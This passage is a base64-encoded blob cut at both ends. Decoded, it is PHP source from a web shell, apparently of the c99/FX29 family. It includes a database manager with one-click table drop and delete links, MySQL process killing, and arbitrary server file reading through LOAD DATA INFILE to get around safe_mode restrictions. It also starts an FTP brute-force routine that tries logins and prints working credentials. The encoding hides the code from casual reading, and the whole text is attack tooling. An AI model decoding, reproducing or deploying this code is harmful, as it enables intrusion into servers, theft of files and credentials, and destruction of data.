9sb3JMaWdodD0jYzBjMGMwIGJvcmRlcj0xPiI7CiAgICAgICAgZWNobyAiPHRyPiI7CiAgICAgICAgZWNobyAiPHRkPjxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwiYm94cm93X2FsbFwiIHZhbHVlPVwiMVwiPjwvdGQ+IjsKICAgICAgICBmb3IgKCRpPTA7JGk8bXlzcWxfbnVtX2ZpZWxkcygkcmVzdWx0KTskaSsrKSB7CiAgICAgICAgICAkdiA9IG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwkaSk7CiAgICAgICAgICBpZiAoJGVbMF0gPT0gImEiKSB7JHMgPSAiZCI7ICRtID0gImFzYyI7fQogICAgICAgICAgZWxzZSB7JHMgPSAiYSI7ICRtID0gImRlc2MiO30KICAgICAgICAgIGVjaG8gIjx0ZD4iOwogICAgICAgICAgaWYgKGVtcHR5KCRlWzBdKSkgeyRlWzBdID0gImEiO30KICAgICAgICAgIGlmICgkZVsxXSAhPSAkdikge2VjaG8gIjxhIGhyZWY9XCIiLiRzcWxfc3VybC4ic3FsX3RibD0iLiRzcWxfdGJsLiImc3FsX3RibF9sZT0iLiRzcWxfdGJsX2xlLiImc3FsX3RibF9scz0iLiRzcWxfdGJsX2xzLiImc3FsX29yZGVyPSIuJGVbMF0uIiUyMCIuJHYuIlwiPjxiPiIuJHYuIjwvYj48L2E+Ijt9CiAgICAgICAgICBlbHNlIHtlY2hvICI8Yj4iLiR2LiI8L2I+PGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfdGJsPSIuJHNxbF90YmwuIiZzcWxfdGJsX2xlPSIuJHNxbF90YmxfbGUuIiZzcWxfdGJsX2xzPSIuJHNxbF90YmxfbHMuIiZzcWxfb3JkZXI9Ii4kcy4iJTIwIi4kdi4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1zb3J0XyIuJG0uIlwiIGhlaWdodD1cIjlcIiB3aWR0aD1cIjE0XCIgYWx0PVwiIi4kbS4iXCI+PC9hPiI7fQogICAgICAgICAgZWNobyAiPC90ZD4iOwogICAgICAgIH0KICAgICAgZWNobyAiPHRkPjxmb250IGNvbG9yPVwiZ3JlZW5cIj48Yj5BY3Rpb248L2I+PC9mb250PjwvdGQ+IjsKICAgICAgZWNobyAiPC90cj4iOwogICAgICB3aGlsZSAoJHJvdyA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXN1bHQsIE1ZU1FMX0FTU09DKSkgewogICAgICAgZWNobyAiPHRyPiI7CiAgICAgICAkdyA9ICIiOwogICAgICAgJGkgPSAwOwogICAgICAgZm9yZWFjaCAoJHJvdyBhcyAkaz0+JHYpIHskbmFtZSA9IG15c3FsX2ZpZWxkX25hbWUoJHJlc3VsdCwkaSk7ICR3IC49ICIgYCIuJG5hbWUuImAgPSAnIi5hZGRzbGFzaGVzKCR2KS4iJyBBTkQiOyAkaSsrO30KICAgICAgIGlmIChjb3VudCgkcm93KSA+IDApIHskdyA9IHN1YnN0cigkdywwLHN0cmxlbigkdyktMyk7fQogICAgICAgZWNobyAiPHRkPjxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwiYm94cm93W11cIiB2YWx1ZT1cIiIuJHcuIlwiPjwvdGQ+IjsKICAgICAgICRpID0gMDsKICAgICAgIGZvcmVhY2ggKCRyb3cgYXMgJGs9PiR2KQogICAgICAgewogICAgICAgICR2ID0gaHRtbHNwZWNpYWxjaGFycygkdik7CiAgICAgICAgaWYgKCR2ID09ICIiKSB7JHYgPSAiPGZvbnQgY29sb3I9XCJncmVlblwiPk5VTEw8L2ZvbnQ+Ijt9CiAgICAgICAgZWNobyAiPHRkPiIuJHYuIjwvdGQ+IjsKICAgICAgICAkaSsrOwogICAgICAgfQogICAgICAgZWNobyAiPHRkPiI7CiAgICAgICBlY2hvICI8YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF9hY3Q9cXVlcnkmc3FsX3RibD0iLnVybGVuY29kZSgkc3FsX3RibCkuIiZzcWxfdGJsX2xzPSIuJHNxbF90YmxfbHMuIiZzcWxfdGJsX2xlPSIuJHNxbF90YmxfbGUuIiZzcWxfcXVlcnk9Ii51cmxlbmNvZGUoIkRFTEVURSBGUk9NIGAiLiRzcWxfdGJsLiJgIFdIRVJFIi4kdy4iIExJTUlUIDE7IikuIlwiPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9c3FsX2J1dHRvbl9kcm9wXCIgYWx0PVwiRGVsZXRlXCIgaGVpZ2h0PVwiMTNcIiB3aWR0aD1cIjExXCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDsiOwogICAgICAgZWNobyAiPGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfdGJsX2FjdD1pbnNlcnQmc3FsX3RibD0iLnVybGVuY29kZSgkc3FsX3RibCkuIiZzcWxfdGJsX2xzPSIuJHNxbF90YmxfbHMuIiZzcWxfdGJsX2xlPSIuJHNxbF90YmxfbGUuIiZzcWxfdGJsX2luc2VydF9xPSIudXJsZW5jb2RlKCR3KS4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1jaGFuZ2VcIiBhbHQ9XCJFZGl0XCIgaGVpZ2h0PVwiMTRcIiB3aWR0aD1cIjE0XCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDsiOwogICAgICAgZWNobyAiPC90ZD4iOwogICAgICAgZWNobyAiPC90cj4iOwogICAgICB9CiAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICBlY2hvICI8L3RhYmxlPjxociBzaXplPVwiMVwiIG5vc2hhZGU+PHAgYWxpZ249XCJsZWZ0XCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1hcnJvd19sdHJcIiBib3JkZXI9XCIwXCI+PHNlbGVjdCBuYW1lPVwic3FsX2FjdFwiPiI7CiAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJcIj5XaXRoIHNlbGVjdGVkOjwvb3B0aW9uPiI7CiAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJkZWxldGVyb3dcIj5EZWxldGU8L29wdGlvbj4iOwogICAgICBlY2hvICI8L3NlbGVjdD4mbmJzcDs8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiQ29uZmlybVwiPjwvZm9ybT48L3A+IjsKICAgICB9CiAgICB9CiAgICBlbHNlIHsKICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgVEFCTEUgU1RBVFVTIiwgJHNxbF9zb2NrKTsKICAgICBpZiAoISRyZXN1bHQpIHtlY2hvIG15c3FsX3NtYXJ0ZXJyb3IoKTt9CiAgICAgZWxzZQogICAgIHsKICAgICAgZWNobyAiPGJyPjxmb3JtIG1ldGhvZD1cIlBPU1RcIj48VEFCTEUgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9IzY2NjY2NiBjZWxsUGFkZGluZz01IHdpZHRoPVwiMTAwJVwiIGJnY29sb3I9IzAwMDAwMCBib3JkZXJDb2xvckxpZ2h0PSNjMGMwYzAgYm9yZGVyPTE+PHRyPjx0ZD48aW5wdXQgdHlwZT1cImNoZWNrYm94XCIgbmFtZT1cImJveHRibF9hbGxcIiB2YWx1ZT1cIjFcIj48L3RkPjx0ZD48Y2VudGVyPjxiPlRhYmxlPC9iPjwvY2VudGVyPjwvdGQ+PHRkPjxiPlJvd3M8L2I+PC90ZD48dGQ+PGI+VHlwZTwvYj48L3RkPjx0ZD48Yj5DcmVhdGVkPC9iPjwvdGQ+PHRkPjxiPk1vZGlmaWVkPC9iPjwvdGQ+PHRkPjxiPlNpemU8L2I+PC90ZD48dGQ+PGI+QWN0aW9uPC9iPjwvdGQ+PC90cj4iOwogICAgICAkaSA9IDA7CiAgICAgICR0c2l6ZSA9ICR0cm93cyA9IDA7CiAgICAgIHdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCwgTVlTUUxfQVNTT0MpKQogICAgICB7CiAgICAgICAkdHNpemUgKz0gJHJvd1siRGF0YV9sZW5ndGgiXTsKICAgICAgICR0cm93cyArPSAkcm93WyJSb3dzIl07CiAgICAgICAkc2l6ZSA9IHZpZXdfc2l6ZSgkcm93WyJEYXRhX2xlbmd0aCJdKTsKICAgICAgIGVjaG8gIjx0cj4iOwogICAgICAgZWNobyAiPHRkPjxpbnB1dCB0eXBlPVwiY2hlY2tib3hcIiBuYW1lPVwiYm94dGJsW11cIiB2YWx1ZT1cIiIuJHJvd1siTmFtZSJdLiJcIj48L3RkPiI7CiAgICAgICBlY2hvICI8dGQ+Jm5ic3A7PGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfdGJsPSIudXJsZW5jb2RlKCRyb3dbIk5hbWUiXSkuIlwiPjxiPiIuJHJvd1siTmFtZSJdLiI8L2I+PC9hPiZuYnNwOzwvdGQ+IjsKICAgICAgIGVjaG8gIjx0ZD4iLiRyb3dbIlJvd3MiXS4iPC90ZD4iOwogICAgICAgZWNobyAiPHRkPiIuJHJvd1siVHlwZSJdLiI8L3RkPiI7CiAgICAgICBlY2hvICI8dGQ+Ii4kcm93WyJDcmVhdGVfdGltZSJdLiI8L3RkPiI7CiAgICAgICBlY2hvICI8dGQ+Ii4kcm93WyJVcGRhdGVfdGltZSJdLiI8L3RkPiI7CiAgICAgICBlY2hvICI8dGQ+Ii4kc2l6ZS4iPC90ZD4iOwogICAgICAgZWNobyAiPHRkPiZuYnNwOzxhIGhyZWY9XCIiLiRzcWxfc3VybC4ic3FsX2FjdD1xdWVyeSZzcWxfcXVlcnk9Ii51cmxlbmNvZGUoIkRFTEVURSBGUk9NIGAiLiRyb3dbIk5hbWUiXS4iYCIpLiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNxbF9idXR0b25fZW1wdHlcIiBhbHQ9XCJFbXB0eVwiIGhlaWdodD1cIjEzXCIgd2lkdGg9XCIxMVwiIGJvcmRlcj1cIjBcIj48L2E+Jm5ic3A7Jm5ic3A7PGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfYWN0PXF1ZXJ5JnNxbF9xdWVyeT0iLnVybGVuY29kZSgiRFJPUCBUQUJMRSBgIi4kcm93WyJOYW1lIl0uImAiKS4iXCI+PGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1zcWxfYnV0dG9uX2Ryb3BcIiBhbHQ9XCJEcm9wXCIgaGVpZ2h0PVwiMTNcIiB3aWR0aD1cIjExXCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDs8YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF90YmxfYWN0PWluc2VydCZzcWxfdGJsPSIuJHJvd1siTmFtZSJdLiJcIj48aW1nIHNyYz1cIiIuJHN1cmwuImFjdD1pbWcmaW1nPXNxbF9idXR0b25faW5zZXJ0XCIgYWx0PVwiSW5zZXJ0XCIgaGVpZ2h0PVwiMTNcIiB3aWR0aD1cIjExXCIgYm9yZGVyPVwiMFwiPjwvYT4mbmJzcDs8L3RkPiI7CiAgICAgICBlY2hvICI8L3RyPiI7CiAgICAgICAkaSsrOwogICAgICB9CiAgICAgIGVjaG8gIjx0ciBiZ2NvbG9yPVwiMDAwMDAwXCI+IjsKICAgICAgZWNobyAiPHRkPjxjZW50ZXI+PGI+KzwvYj48L2NlbnRlcj48L3RkPiI7CiAgICAgIGVjaG8gIjx0ZD48Y2VudGVyPjxiPiIuJGkuIiB0YWJsZShzKTwvYj48L2NlbnRlcj48L3RkPiI7CiAgICAgIGVjaG8gIjx0ZD48Yj4iLiR0cm93cy4iPC9iPjwvdGQ+IjsKICAgICAgZWNobyAiPHRkPiIuJHJvd1sxXS4iPC90ZD4iOwogICAgICBlY2hvICI8dGQ+Ii4kcm93WzEwXS4iPC90ZD4iOwogICAgICBlY2hvICI8dGQ+Ii4kcm93WzExXS4iPC90ZD4iOwogICAgICBlY2hvICI8dGQ+PGI+Ii52aWV3X3NpemUoJHRzaXplKS4iPC9iPjwvdGQ+IjsKICAgICAgZWNobyAiPHRkPjwvdGQ+IjsKICAgICAgZWNobyAiPC90cj4iOwogICAgICBlY2hvICI8L3RhYmxlPjxociBzaXplPVwiMVwiIG5vc2hhZGU+PHAgYWxpZ249XCJyaWdodFwiPjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9YXJyb3dfbHRyXCIgYm9yZGVyPVwiMFwiPjxzZWxlY3QgbmFtZT1cInNxbF9hY3RcIj4iOwogICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPVwiXCI+V2l0aCBzZWxlY3RlZDo8L29wdGlvbj4iOwogICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPVwidGJsZHJvcFwiPkRyb3A8L29wdGlvbj4iOwogICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPVwidGJsZW1wdHlcIj5FbXB0eTwvb3B0aW9uPiI7CiAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJ0YmxkdW1wXCI+RHVtcDwvb3B0aW9uPiI7CiAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJ0YmxjaGVja1wiPkNoZWNrIHRhYmxlPC9vcHRpb24+IjsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1cInRibG9wdGltaXplXCI+T3B0aW1pemUgdGFibGU8L29wdGlvbj4iOwogICAgICBlY2hvICI8b3B0aW9uIHZhbHVlPVwidGJscmVwYWlyXCI+UmVwYWlyIHRhYmxlPC9vcHRpb24+IjsKICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT1cInRibGFuYWx5emVcIj5BbmFseXplIHRhYmxlPC9vcHRpb24+IjsKICAgICAgZWNobyAiPC9zZWxlY3Q+Jm5ic3A7PGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIkNvbmZpcm1cIj48L2Zvcm0+PC9wPiI7CiAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgIH0KICAgIH0KICAgfQogICB9CiAgfQogIGVsc2UgewogICAkYWN0cyA9IGFycmF5KCIiLCJuZXdkYiIsInNlcnZlcnN0YXR1cyIsInNlcnZlcnZhcnMiLCJwcm9jZXNzZXMiLCJnZXRmaWxlIik7CiAgIGlmIChpbl9hcnJheSgkc3FsX2FjdCwkYWN0cykpIHs/Pjx0YWJsZSBib3JkZXI9IjAiIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEiPjx0cj48dGQgd2lkdGg9IjMwJSIgaGVpZ2h0PSIxIj48Yj5DcmVhdGUgbmV3IERCOjwvYj48Zm9ybSBhY3Rpb249Ijw/cGhwIGVjaG8gJHN1cmw7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3QiIHZhbHVlPSJzcWwiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9hY3QiIHZhbHVlPSJuZXdkYiI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2xvZ2luIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfbG9naW4pOyA/PiI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX3Bhc3N3ZCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCk7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfc2VydmVyIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKTsgPz4iPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9wb3J0IiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfcG9ydCk7ID8+Ij48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ic3FsX25ld2RiIiBzaXplPSIyMCI+Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkNyZWF0ZSI+PC9mb3JtPjwvdGQ+PHRkIHdpZHRoPSIzMCUiIGhlaWdodD0iMSI+PGI+VmlldyBGaWxlOjwvYj48Zm9ybSBhY3Rpb249Ijw/cGhwIGVjaG8gJHN1cmw7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3QiIHZhbHVlPSJzcWwiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9hY3QiIHZhbHVlPSJnZXRmaWxlIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfbG9naW4iIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbik7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfcGFzc3dkIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfcGFzc3dkKTsgPz4iPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9zZXJ2ZXIiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9zZXJ2ZXIpOyA/PiI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX3BvcnQiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KTsgPz4iPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzcWxfZ2V0ZmlsZSIgc2l6ZT0iMzAiIHZhbHVlPSI8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJHNxbF9nZXRmaWxlKTsgPz4iPiZuYnNwOzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHZXQiPjwvZm9ybT48L3RkPjx0ZCB3aWR0aD0iMzAlIiBoZWlnaHQ9IjEiPjwvdGQ+PC90cj48dHI+PHRkIHdpZHRoPSIzMCUiIGhlaWdodD0iMSI+PC90ZD48dGQgd2lkdGg9IjMwJSIgaGVpZ2h0PSIxIj48L3RkPjx0ZCB3aWR0aD0iMzAlIiBoZWlnaHQ9IjEiPjwvdGQ+PC90cj48L3RhYmxlPjw/cGhwIH0KICAgaWYgKCFlbXB0eSgkc3FsX2FjdCkpIHsKICAgIGVjaG8gIjxociBzaXplPVwiMVwiIG5vc2hhZGU+IjsKICAgIGlmICgkc3FsX2FjdCA9PSAibmV3ZGIiKSB7CiAgICAgZWNobyAiPGI+IjsKICAgICBpZiAoKG15c3FsX2NyZWF0ZV9kYiAoJHNxbF9uZXdkYikpIGFuZCAoIWVtcHR5KCRzcWxfbmV3ZGIpKSkge2VjaG8gIkRCIFwiIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfbmV3ZGIpLiJcIiBoYXMgYmVlbiBjcmVhdGVkIHdpdGggc3VjY2VzcyE8L2I+PGJyPiI7fQogICAgIGVsc2Uge2VjaG8gIkNhbid0IGNyZWF0ZSBEQiBcIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX25ld2RiKS4iXCIuPGJyPlJlYXNvbjo8L2I+ICIubXlzcWxfc21hcnRlcnJvcigpO30KICAgIH0KICAgIGlmICgkc3FsX2FjdCA9PSAic2VydmVyc3RhdHVzIikgewogICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0hPVyBTVEFUVVMiLCAkc3FsX3NvY2spOwogICAgIGVjaG8gIjxjZW50ZXI+PGI+U2VydmVyLXN0YXR1cyB2YXJpYWJsZXM6PC9iPjxicj48YnI+IjsKICAgICBlY2hvICI8VEFCTEUgY2VsbFNwYWNpbmc9MCBjZWxsUGFkZGluZz0wIGJnY29sb3I9IzAwMDAwMCBib3JkZXJDb2xvckxpZ2h0PSMzMzMzMzMgYm9yZGVyPTE+PHRkPjxiPk5hbWU8L2I+PC90ZD48dGQ+PGI+VmFsdWU8L2I+PC90ZD48L3RyPiI7CiAgICAgd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0LCBNWVNRTF9OVU0pKSB7ZWNobyAiPHRyPjx0ZD4iLiRyb3dbMF0uIjwvdGQ+PHRkPiIuJHJvd1sxXS4iPC90ZD48L3RyPiI7fQogICAgIGVjaG8gIjwvdGFibGU+PC9jZW50ZXI+IjsKICAgICBteXNxbF9mcmVlX3Jlc3VsdCgkcmVzdWx0KTsKICAgIH0KICAgIGlmICgkc3FsX2FjdCA9PSAic2VydmVydmFycyIpIHsKICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgVkFSSUFCTEVTIiwgJHNxbF9zb2NrKTsKICAgICBlY2hvICI8Y2VudGVyPjxiPlNlcnZlciB2YXJpYWJsZXM6PC9iPjxicj48YnI+IjsKICAgICBlY2hvICI8VEFCTEUgY2VsbFNwYWNpbmc9MCBjZWxsUGFkZGluZz0wIGJnY29sb3I9IzAwMDAwMCBib3JkZXJDb2xvckxpZ2h0PSMzMzMzMzMgYm9yZGVyPTE+PHRkPjxiPk5hbWU8L2I+PC90ZD48dGQ+PGI+VmFsdWU8L2I+PC90ZD48L3RyPiI7CiAgICAgd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0LCBNWVNRTF9OVU0pKSB7ZWNobyAiPHRyPjx0ZD4iLiRyb3dbMF0uIjwvdGQ+PHRkPiIuJHJvd1sxXS4iPC90ZD48L3RyPiI7fQogICAgIGVjaG8gIjwvdGFibGU+IjsKICAgICBteXNxbF9mcmVlX3Jlc3VsdCgkcmVzdWx0KTsKICAgIH0KICAgIGlmICgkc3FsX2FjdCA9PSAicHJvY2Vzc2VzIikgewogICAgIGlmICghZW1wdHkoJGtpbGwpKSB7CiAgICAgICAkcXVlcnkgPSAiS0lMTCAiLiRraWxsLiI7IjsKICAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnksICRzcWxfc29jayk7CiAgICAgICBlY2hvICI8Yj5Qcm9jZXNzICMiLiRraWxsLiIgd2FzIGtpbGxlZC48L2I+IjsKICAgICB9CiAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTSE9XIFBST0NFU1NMSVNUIiwgJHNxbF9zb2NrKTsKICAgICBlY2hvICI8Y2VudGVyPjxiPlByb2Nlc3Nlczo8L2I+PGJyPjxicj4iOwogICAgIGVjaG8gIjxUQUJMRSBjZWxsU3BhY2luZz0wIGNlbGxQYWRkaW5nPTIgYm9yZGVyQ29sb3JMaWdodD0jMzMzMzMzIGJvcmRlcj0xPjx0ZD48Yj5JRDwvYj48L3RkPjx0ZD48Yj5VU0VSPC9iPjwvdGQ+PHRkPjxiPkhPU1Q8L2I+PC90ZD48dGQ+PGI+REI8L2I+PC90ZD48dGQ+PGI+Q09NTUFORDwvYj48L3RkPjx0ZD48Yj5USU1FPC9iPjwvdGQ+PHRkPjxiPlNUQVRFPC9iPjwvdGQ+PHRkPjxiPklORk88L2I+PC90ZD48dGQ+PGI+QWN0aW9uPC9iPjwvdGQ+PC90cj4iOwogICAgIHdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCwgTVlTUUxfTlVNKSkgeyBlY2hvICI8dHI+PHRkPiIuJHJvd1swXS4iPC90ZD48dGQ+Ii4kcm93WzFdLiI8L3RkPjx0ZD4iLiRyb3dbMl0uIjwvdGQ+PHRkPiIuJHJvd1szXS4iPC90ZD48dGQ+Ii4kcm93WzRdLiI8L3RkPjx0ZD4iLiRyb3dbNV0uIjwvdGQ+PHRkPiIuJHJvd1s2XS4iPC90ZD48dGQ+Ii4kcm93WzddLiI8L3RkPjx0ZD48YSBocmVmPVwiIi4kc3FsX3N1cmwuInNxbF9hY3Q9cHJvY2Vzc2VzJmtpbGw9Ii4kcm93WzBdLiJcIj48dT5LaWxsPC91PjwvYT48L3RkPjwvdHI+Ijt9CiAgICAgZWNobyAiPC90YWJsZT4iOwogICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgfQogICAgaWYgKCRzcWxfYWN0ID09ICJnZXRmaWxlIikKICAgIHsKICAgICAkdG1wZGIgPSAkc3FsX2xvZ2luLiJfdG1wZGIiOwogICAgICRzZWxlY3QgPSBteXNxbF9zZWxlY3RfZGIoJHRtcGRiKTsKICAgICBpZiAoISRzZWxlY3QpIHtteXNxbF9jcmVhdGVfZGIoJHRtcGRiKTsgJHNlbGVjdCA9IG15c3FsX3NlbGVjdF9kYigkdG1wZGIpOyAkY3JlYXRlZCA9ICEhJHNlbGVjdDt9CiAgICAgaWYgKCRzZWxlY3QpCiAgICAgewogICAgICAkY3JlYXRlZCA9IEZBTFNFOwogICAgICBteXNxbF9xdWVyeSgiQ1JFQVRFIFRBQkxFIGB0bXBfZmlsZWAgKCBgVmlld2luZyB0aGUgZmlsZSBpbiBzYWZlX21vZGUrb3Blbl9iYXNlZGlyYCBMT05HQkxPQiBOT1QgTlVMTCApOyIpOwogICAgICBteXNxbF9xdWVyeSgiTE9BRCBEQVRBIElORklMRSBcIiIuYWRkc2xhc2hlcygkc3FsX2dldGZpbGUpLiJcIiBJTlRPIFRBQkxFIHRtcF9maWxlIik7CiAgICAgICRyZXN1bHQgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSB0bXBfZmlsZTsiKTsKICAgICAgaWYgKCEkcmVzdWx0KSB7ZWNobyAiPGI+RXJyb3IgaW4gcmVhZGluZyBmaWxlIChwZXJtaXNpb24gZGVuaWVkKSE8L2I+Ijt9CiAgICAgIGVsc2UKICAgICAgewogICAgICAgZm9yICgkaT0wOyRpPG15c3FsX251bV9maWVsZHMoJHJlc3VsdCk7JGkrKykgeyRuYW1lID0gbXlzcWxfZmllbGRfbmFtZSgkcmVzdWx0LCRpKTt9CiAgICAgICAkZiA9ICIiOwogICAgICAgd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0LCBNWVNRTF9BU1NPQykpIHskZiAuPSBqb2luICgiXHJcbiIsJHJvdyk7fQogICAgICAgaWYgKGVtcHR5KCRmKSkge2VjaG8gIjxiPkZpbGUgXCIiLiRzcWxfZ2V0ZmlsZS4iXCIgZG9lcyBub3QgZXhpc3RzIG9yIGVtcHR5ITwvYj48YnI+Ijt9CiAgICAgICBlbHNlIHtlY2hvICI8Yj5GaWxlIFwiIi4kc3FsX2dldGZpbGUuIlwiOjwvYj48YnI+Ii5ubDJicihodG1sc3BlY2lhbGNoYXJzKCRmKSkuIjxicj4iO30KICAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICAgbXlzcWxfcXVlcnkoIkRST1AgVEFCTEUgdG1wX2ZpbGU7Iik7CiAgICAgIH0KICAgICB9CiAgICAgbXlzcWxfZHJvcF9kYigkdG1wZGIpOwogICAgfQogICB9CiAgfQp9CmVjaG8gIjwvdGQ+PC90cj48L3RhYmxlPlxuIjsKaWYgKCRzcWxfc29jaykgewogICRhZmZlY3RlZCA9IEBteXNxbF9hZmZlY3RlZF9yb3dzKCRzcWxfc29jayk7CiAgaWYgKCghaXNfbnVtZXJpYygkYWZmZWN0ZWQpKSBvciAoJGFmZmVjdGVkIDwgMCkpeyRhZmZlY3RlZCA9IDA7fQogIGVjaG8gIjx0cj48dGQ+PGNlbnRlcj48Yj5BZmZlY3RlZCByb3dzIDogIi4kYWZmZWN0ZWQuIjwvY2VudGVyPjwvdGQ+PC90cj4iOwp9CmVjaG8gIjwvdGFibGU+XG4iOwp9Ci8vRW5kIG9mIFNRTCBNYW5hZ2VyCmlmICgkYWN0ID09ICJmdHBxdWlja2JydXRlIikgewplY2hvICI8Y2VudGVyPjx0YWJsZT48dHI+PHRkIGNsYXNzPWJhcmhlYWRlciBjb2xzcGFuPTI+IjsKZWNobyAiLjogRnRwIFF1aWNrIEJydXRlIDouPC90ZD48L3RyPiI7CmVjaG8gIjx0cj48dGQ+IjsKaWYgKCR3aW4pIHsgZWNobyAiQ2FuJ3QgcnVuIG9uIFdpbmRvd3MhIjsgfQplbHNlIHsKICBmdW5jdGlvbiBmeDI5ZnRwYnJ1dGVjaGVjaygkaG9zdCwkcG9ydCwkdGltZW91dCwkbG9naW4sJHBhc3MsJHNoLCRmcWJfb25seXdpdGhzaCkgewogICAgaWYgKCRmcWJfb25seXdpdGhzaCkgeyRUUlVFID0gKCFpbl9hcnJheSgkc2gsYXJyYXkoIi9iaW4vRkFMU0UiLCIvc2Jpbi9ub2xvZ2luIikpKTt9CiAgICBlbHNlIHskVFJVRSA9IFRSVUU7fQogICAgaWYgKCRUUlVFKSB7CiAgICAgICRzb2NrID0gQGZ0cF9jb25uZWN0KCRob3N0LCRwb3J0LCR0aW1lb3V0KTsKICAgICAgaWYgKEBmdHBfbG9naW4oJHNvY2ssJGxvZ2luLCRwYXNzKSkgewogICAgICAgIGVjaG8gIjxhIGhyZWY9XCJmdHA6Ly8iLiRsb2dpbi4iOiIuJHBhc3MuIkAiLiRob3N0LiJcIiB0YXJnZXQ9XCJfYmxhbmtcIj48Yj5Db25uZWN0ZWQgdG8gIi4kaG9zdC4iIHdpdGggbG9naW4gXCIiLiRsb2dpbi4iXCIgYW5kIHBhc3N3b3JkIFwiIi4kcGFzcy4iXCI8L2I+PC9hPi48YnI+IjsKICAgICAgICBvYl9mbHVzaCgp